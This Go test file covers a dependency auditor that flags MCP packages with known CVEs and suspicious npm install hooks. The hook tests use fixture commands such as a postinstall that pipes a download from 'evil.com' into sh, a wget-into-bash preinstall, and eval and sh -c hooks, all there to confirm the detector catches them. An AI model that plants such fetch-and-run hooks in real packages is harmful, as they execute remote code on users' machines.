package providers

import (
	"encoding/json"
	"os"
	"path/filepath"
	"testing"
)

// ── helpers ──────────────────────────────────────────────────────────────────

func newDepAuditorForTest(t *testing.T) DepAuditor {
	t.Helper()
	return NewDepAuditor()
}

// writeFile creates a file at dir/name with the given content.
func writeFile(t *testing.T, dir, name, content string) string {
	t.Helper()
	path := filepath.Join(dir, name)
	if err := os.WriteFile(path, []byte(content), 0o600); err != nil {
		t.Fatalf("writeFile %s: %v", path, err)
	}
	return path
}

// findingsByRule filters findings by rule name.
func findingsByRule(findings []Finding, rule string) []Finding {
	var out []Finding
	for _, f := range findings {
		if f.Rule == rule {
			out = append(out, f)
		}
	}
	return out
}

// hasFindingContaining returns true when any finding message contains substr.
func hasFindingContaining(findings []Finding, substr string) bool {
	for _, f := range findings {
		if contains(f.Message, substr) {
			return true
		}
	}
	return false
}

func contains(s, sub string) bool {
	return len(s) >= len(sub) && (s == sub || len(sub) == 0 ||
		func() bool {
			for i := 0; i <= len(s)-len(sub); i++ {
				if s[i:i+len(sub)] == sub {
					return true
				}
			}
			return false
		}())
}

// ── package.json tests ────────────────────────────────────────────────────────

func TestDepAuditor_PackageJSON_VulnerableVersion(t *testing.T) {
	dir := t.TempDir()
	pkg := map[string]any{
		"name":    "test-app",
		"version": "1.0.0",
		"dependencies": map[string]string{
			"mcp-remote": "0.1.10", // <= 0.1.15, affected
		},
	}
	data, _ := json.Marshal(pkg)
	writeFile(t, dir, "package.json", string(data))

	auditor := newDepAuditorForTest(t)
	findings := auditor.AuditDirectory(dir)

	vulns := findingsByRule(findings, "dep-audit-vulnerable")
	if len(vulns) == 0 {
		t.Fatal("expected at least one dep-audit-vulnerable finding")
	}
	if !hasFindingContaining(vulns, "mcp-remote") {
		t.Error("expected finding to mention 'mcp-remote'")
	}
	if !hasFindingContaining(vulns, "CVE-2025-6514") {
		t.Error("expected finding to mention CVE-2025-6514")
	}
	if vulns[0].Severity != SeverityCritical {
		t.Errorf("expected SeverityCritical, got %v", vulns[0].Severity)
	}
	if vulns[0].Fix == "" {
		t.Error("expected Fix hint to be populated")
	}
}

func TestDepAuditor_PackageJSON_SafeVersion(t *testing.T) {
	dir := t.TempDir()
	// mcp-remote > 0.1.15 is safe
	pkg := map[string]any{
		"dependencies": map[string]string{
			"mcp-remote": "0.2.0",
		},
	}
	data, _ := json.Marshal(pkg)
	writeFile(t, dir, "package.json", string(data))

	auditor := newDepAuditorForTest(t)
	findings := auditor.AuditDirectory(dir)

	if len(findingsByRule(findings, "dep-audit-vulnerable")) > 0 {
		t.Error("expected no vulnerable findings for a safe version")
	}
}

func TestDepAuditor_PackageJSON_MultipleVulns_SamePackage(t *testing.T) {
	// @modelcontextprotocol/server-filesystem has two CVEs at <= 0.6.3
	dir := t.TempDir()
	pkg := map[string]any{
		"dependencies": map[string]string{
			"@modelcontextprotocol/server-filesystem": "0.5.0",
		},
	}
	data, _ := json.Marshal(pkg)
	writeFile(t, dir, "package.json", string(data))

	auditor := newDepAuditorForTest(t)
	findings := auditor.AuditDirectory(dir)

	vulns := findingsByRule(findings, "dep-audit-vulnerable")
	if len(vulns) < 2 {
		t.Errorf("expected at least 2 findings (two CVEs), got %d", len(vulns))
	}
}

func TestDepAuditor_PackageJSON_DevDependencies_Scanned(t *testing.T) {
	dir := t.TempDir()
	pkg := map[string]any{
		"devDependencies": map[string]string{
			"@modelcontextprotocol/inspector": "0.10.0",
		},
	}
	data, _ := json.Marshal(pkg)
	writeFile(t, dir, "package.json", string(data))

	auditor := newDepAuditorForTest(t)
	findings := auditor.AuditDirectory(dir)

	vulns := findingsByRule(findings, "dep-audit-vulnerable")
	if len(vulns) == 0 {
		t.Fatal("expected devDependency to be scanned for vulnerabilities")
	}
	if !hasFindingContaining(vulns, "CVE-2025-49596") {
		t.Error("expected CVE-2025-49596 in findings")
	}
}

func TestDepAuditor_PackageJSON_UnpinnedVersion(t *testing.T) {
	dir := t.TempDir()
	pkg := map[string]any{
		"dependencies": map[string]string{
			"mcp-remote": "latest",
		},
	}
	data, _ := json.Marshal(pkg)
	writeFile(t, dir, "package.json", string(data))

	auditor := newDepAuditorForTest(t)
	findings := auditor.AuditDirectory(dir)

	warns := findingsByRule(findings, "dep-audit-unknown-version")
	if len(warns) == 0 {
		t.Fatal("expected dep-audit-unknown-version finding for 'latest'")
	}
	if warns[0].Severity != SeverityWarning {
		t.Errorf("expected SeverityWarning, got %v", warns[0].Severity)
	}
}

func TestDepAuditor_PackageJSON_CaretVersion(t *testing.T) {
	dir := t.TempDir()
	// ^0.1.10 strips to 0.1.10 which is <= 0.1.15 → vulnerable
	pkg := map[string]any{
		"dependencies": map[string]string{
			"mcp-remote": "^0.1.10",
		},
	}
	data, _ := json.Marshal(pkg)
	writeFile(t, dir, "package.json", string(data))

	auditor := newDepAuditorForTest(t)
	findings := auditor.AuditDirectory(dir)

	if len(findingsByRule(findings, "dep-audit-vulnerable")) == 0 {
		t.Error("expected vulnerable finding after stripping ^ prefix")
	}
}

func TestDepAuditor_PackageJSON_TildeVersion(t *testing.T) {
	dir := t.TempDir()
	// ~0.1.15 strips to 0.1.15 which is == 0.1.15 → vulnerable (boundary)
	pkg := map[string]any{
		"dependencies": map[string]string{
			"mcp-remote": "~0.1.15",
		},
	}
	data, _ := json.Marshal(pkg)
	writeFile(t, dir, "package.json", string(data))

	auditor := newDepAuditorForTest(t)
	findings := auditor.AuditDirectory(dir)

	if len(findingsByRule(findings, "dep-audit-vulnerable")) == 0 {
		t.Error("expected vulnerable finding for boundary version 0.1.15")
	}
}

func TestDepAuditor_PackageJSON_NoDependencies(t *testing.T) {
	dir := t.TempDir()
	pkg := map[string]any{
		"name":    "empty",
		"version": "1.0.0",
	}
	data, _ := json.Marshal(pkg)
	writeFile(t, dir, "package.json", string(data))

	auditor := newDepAuditorForTest(t)
	findings := auditor.AuditDirectory(dir)

	if len(findings) != 0 {
		t.Errorf("expected no findings for empty dep list, got %d: %v", len(findings), findings)
	}
}

func TestDepAuditor_PackageJSON_MalformedJSON(t *testing.T) {
	dir := t.TempDir()
	writeFile(t, dir, "package.json", `{ invalid json `)

	auditor := newDepAuditorForTest(t)
	findings := auditor.AuditDirectory(dir)

	parseErrors := findingsByRule(findings, "dep-audit-parse-error")
	if len(parseErrors) == 0 {
		t.Fatal("expected dep-audit-parse-error finding for malformed JSON")
	}
	if parseErrors[0].Severity != SeverityWarning {
		t.Errorf("expected SeverityWarning for parse error, got %v", parseErrors[0].Severity)
	}
}

func TestDepAuditor_PackageJSON_UnknownPackage_NoFindings(t *testing.T) {
	dir := t.TempDir()
	pkg := map[string]any{
		"dependencies": map[string]string{
			"express": "4.18.2",
			"lodash":  "4.17.21",
		},
	}
	data, _ := json.Marshal(pkg)
	writeFile(t, dir, "package.json", string(data))

	auditor := newDepAuditorForTest(t)
	findings := auditor.AuditDirectory(dir)

	if len(findings) != 0 {
		t.Errorf("expected no findings for non-vulnerable packages, got %d", len(findings))
	}
}

// ── postinstall / lifecycle script tests ─────────────────────────────────────

func TestDepAuditor_PostinstallScript_Curl(t *testing.T) {
	dir := t.TempDir()
	pkg := map[string]any{
		"scripts": map[string]string{
			"postinstall": "curl https://evil.com/payload.sh | sh",
		},
	}
	data, _ := json.Marshal(pkg)
	writeFile(t, dir, "package.json", string(data))

	auditor := newDepAuditorForTest(t)
	findings := auditor.AuditDirectory(dir)

	scripts := findingsByRule(findings, "dep-suspicious-install-script")
	if len(scripts) == 0 {
		t.Fatal("expected dep-suspicious-install-script for postinstall with curl")
	}
	if !hasFindingContaining(scripts, "postinstall") {
		t.Error("expected finding to name the hook 'postinstall'")
	}
	if scripts[0].Severity != SeverityHigh {
		t.Errorf("expected SeverityHigh, got %v", scripts[0].Severity)
	}
}

func TestDepAuditor_PreinstallScript_Wget(t *testing.T) {
	dir := t.TempDir()
	pkg := map[string]any{
		"scripts": map[string]string{
			"preinstall": "wget -O - https://cdn.example.com/setup.sh | bash",
		},
	}
	data, _ := json.Marshal(pkg)
	writeFile(t, dir, "package.json", string(data))

	auditor := newDepAuditorForTest(t)
	findings := auditor.AuditDirectory(dir)

	scripts := findingsByRule(findings, "dep-suspicious-install-script")
	if len(scripts) == 0 {
		t.Fatal("expected dep-suspicious-install-script for preinstall with wget")
	}
	if !hasFindingContaining(scripts, "preinstall") {
		t.Error("expected finding to name the hook 'preinstall'")
	}
}

func TestDepAuditor_InstallScript_Eval(t *testing.T) {
	dir := t.TempDir()
	pkg := map[string]any{
		"scripts": map[string]string{
			"install": `eval "$(node -e 'require(\"./setup\")')"`,
		},
	}
	data, _ := json.Marshal(pkg)
	writeFile(t, dir, "package.json", string(data))

	auditor := newDepAuditorForTest(t)
	findings := auditor.AuditDirectory(dir)

	scripts := findingsByRule(findings, "dep-suspicious-install-script")
	if len(scripts) == 0 {
		t.Fatal("expected dep-suspicious-install-script for install with eval")
	}
}

func TestDepAuditor_InstallScript_ShDashC(t *testing.T) {
	dir := t.TempDir()
	pkg := map[string]any{
		"scripts": map[string]string{
			"postinstall": "sh -c 'something dangerous'",
		},
	}
	data, _ := json.Marshal(pkg)
	writeFile(t, dir, "package.json", string(data))

	auditor := newDepAuditorForTest(t)
	findings := auditor.AuditDirectory(dir)

	scripts := findingsByRule(findings, "dep-suspicious-install-script")
	if len(scripts) == 0 {
		t.Fatal("expected dep-suspicious-install-script for sh -c")
	}
}

func TestDepAuditor_SafeScript_NoBuildFlags(t *testing.T) {
	dir := t.TempDir()
	pkg := map[string]any{
		"scripts": map[string]string{
			"postinstall": "node scripts/build.js",
			"build":       "tsc",
		},
	}
	data, _ := json.Marshal(pkg)
	writeFile(t, dir, "package.json", string(data))

	auditor := newDepAuditorForTest(t)
	findings := auditor.AuditDirectory(dir)

	scripts := findingsByRule(findings, "dep-suspicious-install-script")
	if len(scripts) != 0 {
		t.Errorf("expected no suspicious-install-script findings for safe script, got %d", len(scripts))
	}
}

// ── requirements.txt tests ────────────────────────────────────────────────────

func TestDepAuditor_RequirementsTxt_VulnerableVersion(t *testing.T) {
	dir := t.TempDir()
	writeFile(t, dir, "requirements.txt", "mcp-remote==0.1.10\n")

	auditor := newDepAuditorForTest(t)
	findings := auditor.AuditDirectory(dir)

	vulns := findingsByRule(findings, "dep-audit-vulnerable")
	if len(vulns) == 0 {
		t.Fatal("expected dep-audit-vulnerable for mcp-remote==0.1.10")
	}
	if vulns[0].Line == 0 {
		t.Error("expected line number to be set for requirements.txt finding")
	}
}

func TestDepAuditor_RequirementsTxt_SafeVersion(t *testing.T) {
	dir := t.TempDir()
	writeFile(t, dir, "requirements.txt", "mcp-remote==0.2.0\n")

	auditor := newDepAuditorForTest(t)
	findings := auditor.AuditDirectory(dir)

	if len(findingsByRule(findings, "dep-audit-vulnerable")) > 0 {
		t.Error("expected no vulnerable findings for safe requirements.txt version")
	}
}

func TestDepAuditor_RequirementsTxt_NoVersion(t *testing.T) {
	dir := t.TempDir()
	writeFile(t, dir, "requirements.txt", "mcp-remote\n")

	auditor := newDepAuditorForTest(t)
	findings := auditor.AuditDirectory(dir)

	warns := findingsByRule(findings, "dep-audit-unknown-version")
	if len(warns) == 0 {
		t.Fatal("expected dep-audit-unknown-version warning when version is absent")
	}
}

func TestDepAuditor_RequirementsTxt_Comments_AndBlanks_Ignored(t *testing.T) {
	dir := t.TempDir()
	writeFile(t, dir, "requirements.txt",
		"# this is a comment\n\nrequests==2.28.0\n-r other.txt\n")

	auditor := newDepAuditorForTest(t)
	findings := auditor.AuditDirectory(dir)

	if len(findings) != 0 {
		t.Errorf("expected no findings (no known vulns), got %d: %v", len(findings), findings)
	}
}

func TestDepAuditor_RequirementsTxt_InlineComment_Stripped(t *testing.T) {
	dir := t.TempDir()
	writeFile(t, dir, "requirements.txt", "mcp-remote==0.1.10  # pinned for now\n")

	auditor := newDepAuditorForTest(t)
	findings := auditor.AuditDirectory(dir)

	if len(findingsByRule(findings, "dep-audit-vulnerable")) == 0 {
		t.Error("expected vulnerable finding even with inline comment")
	}
}

func TestDepAuditor_RequirementsTxt_GreaterEqual_Operator(t *testing.T) {
	dir := t.TempDir()
	// >=0.1.0 → extracts 0.1.0, which is <= 0.1.15 → vulnerable
	writeFile(t, dir, "requirements.txt", "mcp-remote>=0.1.0\n")

	auditor := newDepAuditorForTest(t)
	findings := auditor.AuditDirectory(dir)

	if len(findingsByRule(findings, "dep-audit-vulnerable")) == 0 {
		t.Error("expected vulnerable finding for mcp-remote>=0.1.0")
	}
}

// ── pyproject.toml tests ──────────────────────────────────────────────────────

func TestDepAuditor_PyprojectToml_VulnerableDep(t *testing.T) {
	dir := t.TempDir()
	toml := `[project]
name = "my-app"
dependencies = [
    "mcp-remote==0.1.5",
    "requests>=2.28",
]
`
	writeFile(t, dir, "pyproject.toml", toml)

	auditor := newDepAuditorForTest(t)
	findings := auditor.AuditDirectory(dir)

	vulns := findingsByRule(findings, "dep-audit-vulnerable")
	if len(vulns) == 0 {
		t.Fatal("expected dep-audit-vulnerable for mcp-remote in pyproject.toml")
	}
	if !hasFindingContaining(vulns, "pyproject.toml") {
		t.Error("expected finding message to mention pyproject.toml")
	}
}

func TestDepAuditor_PyprojectToml_SafeDep(t *testing.T) {
	dir := t.TempDir()
	toml := `[project]
dependencies = [
    "mcp-remote==0.2.0",
]
`
	writeFile(t, dir, "pyproject.toml", toml)

	auditor := newDepAuditorForTest(t)
	findings := auditor.AuditDirectory(dir)

	if len(findingsByRule(findings, "dep-audit-vulnerable")) > 0 {
		t.Error("expected no vulnerable findings for safe pyproject.toml dep")
	}
}

// ── node_modules skip ─────────────────────────────────────────────────────────

func TestDepAuditor_SkipsNodeModules(t *testing.T) {
	dir := t.TempDir()
	nmDir := filepath.Join(dir, "node_modules", "some-pkg")
	if err := os.MkdirAll(nmDir, 0o755); err != nil {
		t.Fatal(err)
	}
	// Place a vulnerable package.json inside node_modules — must be ignored.
	writeFile(t, nmDir, "package.json", `{"dependencies":{"mcp-remote":"0.1.0"}}`)

	auditor := newDepAuditorForTest(t)
	findings := auditor.AuditDirectory(dir)

	if len(findings) != 0 {
		t.Errorf("expected no findings — node_modules must be skipped, got %d", len(findings))
	}
}

// ── version comparison unit tests ─────────────────────────────────────────────

func TestSemverLE_Basic(t *testing.T) {
	tests := []struct {
		a, b string
		want bool
	}{
		{"0.1.10", "0.1.15", true},  // less than
		{"0.1.15", "0.1.15", true},  // equal (boundary)
		{"0.1.16", "0.1.15", false}, // one patch above
		{"0.2.0", "0.1.15", false},  // minor bump
		{"1.0.0", "0.1.15", false},  // major bump
		{"0.0.1", "0.1.15", true},   // older patch
		{"2.4.9", "2.4.9", true},    // exact boundary
		{"2.4.10", "2.4.9", false},  // one patch above boundary
		{"2.5.0", "2.4.9", false},   // minor above boundary
		{"1.2.9", "1.2.9", true},    // exact boundary
		{"1.2.10", "1.2.9", false},  // patch above boundary
	}

	for _, tt := range tests {
		t.Run(tt.a+"<="+tt.b, func(t *testing.T) {
			got := semverLE(tt.a, tt.b)
			if got != tt.want {
				t.Errorf("semverLE(%q, %q) = %v, want %v", tt.a, tt.b, got, tt.want)
			}
		})
	}
}

func TestSemverLE_DateStyle(t *testing.T) {
	// @anthropic/mcp-server-git uses date-style versions: 2025.12.17
	tests := []struct {
		a, b string
		want bool
	}{
		{"2025.12.17", "2025.12.17", true},  // exact match (affected)
		{"2025.12.16", "2025.12.17", true},  // one day before (affected)
		{"2025.12.18", "2025.12.17", false}, // one day after (safe)
		{"2026.1.0", "2025.12.17", false},   // next year (safe)
		{"2024.1.0", "2025.12.17", true},    // previous year (affected)
	}

	for _, tt := range tests {
		t.Run(tt.a+"<="+tt.b, func(t *testing.T) {
			got := semverLE(tt.a, tt.b)
			if got != tt.want {
				t.Errorf("semverLE(%q, %q) = %v, want %v", tt.a, tt.b, got, tt.want)
			}
		})
	}
}

func TestStripVersionPrefix(t *testing.T) {
	tests := []struct {
		input string
		want  string
	}{
		{"^1.2.3", "1.2.3"},
		{"~0.1.15", "0.1.15"},
		{">=2.0.0", "2.0.0"},
		{"<=1.0.0", "1.0.0"},
		{"=1.0.0", "1.0.0"},
		{"1.0.0", "1.0.0"},
		{"latest", "latest"},
		{"*", "*"},
		{"^0.6.2 || ^0.7.0", "0.6.2"},
	}

	for _, tt := range tests {
		t.Run(tt.input, func(t *testing.T) {
			got := stripVersionPrefix(tt.input)
			if got != tt.want {
				t.Errorf("stripVersionPrefix(%q) = %q, want %q", tt.input, got, tt.want)
			}
		})
	}
}

func TestParseRequirementsLine(t *testing.T) {
	tests := []struct {
		input       string
		wantName    string
		wantVersion string
	}{
		{"requests==2.28.0", "requests", "2.28.0"},
		{"flask>=2.0", "flask", "2.0"},
		{"django~=4.0", "django", "4.0"},
		{"numpy!=1.0", "numpy", "1.0"},
		{"bare-package", "bare-package", ""},
		{"", "", ""},
		{"mcp-remote>=0.1.0,<0.2.0", "mcp-remote", "0.1.0"}, // multi-constraint, first wins
	}

	for _, tt := range tests {
		t.Run(tt.input, func(t *testing.T) {
			name, version := parseRequirementsLine(tt.input)
			if name != tt.wantName {
				t.Errorf("name: got %q, want %q", name, tt.wantName)
			}
			if version != tt.wantVersion {
				t.Errorf("version: got %q, want %q", version, tt.wantVersion)
			}
		})
	}
}

// ── integration: multiple files in one directory ──────────────────────────────

func TestDepAuditor_MultipleFiles_AllScanned(t *testing.T) {
	dir := t.TempDir()

	// package.json with one vulnerable dep
	pkg := map[string]any{
		"dependencies": map[string]string{
			"create-mcp-server-stdio": "0.9.0",
		},
	}
	data, _ := json.Marshal(pkg)
	writeFile(t, dir, "package.json", string(data))

	// requirements.txt with one vulnerable dep
	writeFile(t, dir, "requirements.txt", "mcp-remote==0.1.0\n")

	auditor := newDepAuditorForTest(t)
	findings := auditor.AuditDirectory(dir)

	vulns := findingsByRule(findings, "dep-audit-vulnerable")
	if len(vulns) < 2 {
		t.Errorf("expected at least 2 vulnerable findings (one per file), got %d", len(vulns))
	}

	hasNPM := false
	hasPip := false
	for _, f := range vulns {
		if contains(f.File, "package.json") {
			hasNPM = true
		}
		if contains(f.File, "requirements.txt") {
			hasPip = true
		}
	}
	if !hasNPM {
		t.Error("expected a finding from package.json")
	}
	if !hasPip {
		t.Error("expected a finding from requirements.txt")
	}
}

// ── known CVE spot-checks ─────────────────────────────────────────────────────

func TestDepAuditor_CVE2025_53355_McpServerKubernetes(t *testing.T) {
	dir := t.TempDir()
	pkg := map[string]any{
		"dependencies": map[string]string{
			"mcp-server-kubernetes": "2.4.0",
		},
	}
	data, _ := json.Marshal(pkg)
	writeFile(t, dir, "package.json", string(data))

	auditor := newDepAuditorForTest(t)
	findings := auditor.AuditDirectory(dir)

	vulns := findingsByRule(findings, "dep-audit-vulnerable")
	if !hasFindingContaining(vulns, "CVE-2025-53355") {
		t.Errorf("expected CVE-2025-53355 in findings, got: %v", vulns)
	}
}

func TestDepAuditor_CVE2025_68145_AnthropicMCPServerGit(t *testing.T) {
	dir := t.TempDir()
	// Version 2025.12.17 is exactly at the MaxAffected boundary.
	pkg := map[string]any{
		"dependencies": map[string]string{
			"@anthropic/mcp-server-git": "2025.12.17",
		},
	}
	data, _ := json.Marshal(pkg)
	writeFile(t, dir, "package.json", string(data))

	auditor := newDepAuditorForTest(t)
	findings := auditor.AuditDirectory(dir)

	vulns := findingsByRule(findings, "dep-audit-vulnerable")
	if !hasFindingContaining(vulns, "CVE-2025-68145") {
		t.Errorf("expected CVE-2025-68145 in findings, got: %v", vulns)
	}
	if !hasFindingContaining(vulns, "10.0") {
		t.Error("expected CVSS 10.0 in finding message")
	}
}

func TestDepAuditor_CVE2025_54994_CreateMCPServerStdio_SafeVersion(t *testing.T) {
	dir := t.TempDir()
	// 1.0.0 > 0.9.9 — should be safe
	pkg := map[string]any{
		"dependencies": map[string]string{
			"create-mcp-server-stdio": "1.0.0",
		},
	}
	data, _ := json.Marshal(pkg)
	writeFile(t, dir, "package.json", string(data))

	auditor := newDepAuditorForTest(t)
	findings := auditor.AuditDirectory(dir)

	if len(findingsByRule(findings, "dep-audit-vulnerable")) > 0 {
		t.Error("expected no findings for create-mcp-server-stdio@1.0.0 (above MaxAffected)")
	}
}

func TestDepAuditor_EmptyDirectory(t *testing.T) {
	dir := t.TempDir()
	auditor := newDepAuditorForTest(t)
	findings := auditor.AuditDirectory(dir)

	if len(findings) != 0 {
		t.Errorf("expected no findings for empty directory, got %d", len(findings))
	}
}
